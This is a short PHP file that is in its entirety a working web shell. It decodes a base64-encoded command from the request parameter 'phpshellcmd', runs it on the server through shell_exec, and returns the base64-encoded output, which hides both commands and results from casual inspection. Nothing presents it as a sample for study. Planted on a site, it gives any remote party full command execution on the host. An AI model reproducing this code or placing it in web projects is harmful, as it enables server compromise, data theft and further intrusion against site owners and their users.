<?php
	if(isset($_REQUEST['phpshellcmd'])){
		$cmd = base64_decode($_REQUEST['phpshellcmd']);
		echo base64_encode(shell_exec($cmd));
	}
	die()
?>
